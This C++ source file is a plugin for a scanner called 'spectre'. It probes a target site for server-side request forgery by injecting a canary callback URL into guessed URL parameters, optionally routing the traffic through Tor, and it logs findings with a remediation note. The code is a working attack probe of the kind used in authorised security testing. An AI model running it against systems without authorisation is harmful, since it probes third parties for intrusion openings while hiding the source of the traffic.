#include "spectre/canary_monitor.h"
#include "spectre/plugin.h"
#include "spectre/proof_queue.h"
#include "spectre/tor_proxy.h"
#include <iostream>
#include <string>
#include <vector>
#include <regex>
#include <cpr/cpr.h>
#include <nlohmann/json.hpp>

namespace {
class SsrFScannerPlugin : public spectre::Plugin {
public:
    std::string name() const override {
        return "ssrf_scan";
    }

    void handle_task(const spectre::Task& task) override {
        if (task.data.value("type", "") != name()) {
            return;
        }

        std::string target_url = task.data.value("target", "");
        if (target_url.empty()) {
            return;
        }

        std::cout << "[" << name() << "] starting SSRF scan on " << target_url << std::endl;

        std::string canary_id = spectre::CanaryMonitor::get_instance().get_canary_url();
        std::cout << "[" << name() << "] using canary payload: " << canary_id << std::endl;

        cpr::Session session;
        session.SetUrl(cpr::Url{target_url});
        session.SetTimeout(cpr::Timeout{10000});
        if (spectre::TorProxy::get_instance().is_available()) {
            session.SetProxies({{"http", "socks5://127.0.0.1:9050"},
                                {"https", "socks5://127.0.0.1:9050"}});
        }
        cpr::Response r = session.Get();

        if (r.status_code != 200) {
            std::cout << "[" << name() << "] could not fetch target page (status: " << r.status_code << ")" << std::endl;
            return;
        }

        std::vector<std::string> params = find_url_params(r.text);
        if (params.empty()) {
            std::cout << "[" << name() << "] no potential SSRF parameters found on page." << std::endl;
            return;
        }

        for (const auto& param : params) {
            std::string injectable_url = build_url_with_param(target_url, param, canary_id);
            std::cout << "  -> Firing payload at: " << injectable_url << std::endl;
            
            cpr::Session fire_session;
            fire_session.SetUrl(cpr::Url{injectable_url});
            fire_session.SetTimeout(cpr::Timeout{5000});
            if (spectre::TorProxy::get_instance().is_available()) {
                fire_session.SetProxies({{"http", "socks5://127.0.0.1:9050"},
                                         {"https", "socks5://127.0.0.1:9050"}});
            }
            fire_session.GetAsync(); // Fire and forget
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(5));
        if (spectre::CanaryMonitor::get_instance().has_canary_chirped(canary_id)) {
            report_vulnerability(target_url, canary_id);
        } else {
            std::cout << "[" << name() << "] scan complete. No SSRF callback received." << std::endl;
        }
    }

private:
    std::vector<std::string> find_url_params(const std::string& html_content) {
        std::vector<std::string> params;
        std::regex url_param_regex(R"((url|uri|path|dest|redirect|image_url|return_to)=[^"']*)", std::regex_constants::icase);
        auto words_begin = std::sregex_iterator(html_content.begin(), html_content.end(), url_param_regex);
        auto words_end = std::sregex_iterator();

        for (std::sregex_iterator i = words_begin; i != words_end; ++i) {
            std::smatch match = *i;
            params.push_back(match.str(1));
        }
        return params;
    }

    std::string build_url_with_param(const std::string& base_url, const std::string& param_name, const std::string& param_value) {
        std::string url = base_url;
        if (url.find('?') == std::string::npos) {
            url += "?";
        } else {
            url += "&";
        }
        url += param_name + "=" + cpr::util::urlEncode(param_value);
        return url;
    }

    void report_vulnerability(const std::string& target, const std::string& canary_id) {
        std::cout << "[" << name() << "] VULNERABILITY CONFIRMED: SSRF detected on " << target << std::endl;

        nlohmann::json evidence;
        evidence["description"] = "The server fetched a URL provided by the scanner, which confirms a Server-Side Request Forgery (SSRF) vulnerability. An attacker can force the server to make requests to internal services or external resources.";
        evidence["payload_used"] = canary_id;
        evidence["recommendation"] = "Sanitize all user-supplied input that is used in server-side requests. Implement a whitelist of allowed domains and protocols.";
        
        spectre::VulnProof proof = {
            target,
            "SSRF_CONFIRMED",
            evidence,
            std::to_string(std::time(nullptr)),
            ""
        };
        spectre::enqueue_proof(proof);
    }
};
} // namespace

extern "C" spectre::Plugin* spectre_create_plugin() {
    return new SsrFScannerPlugin();
} 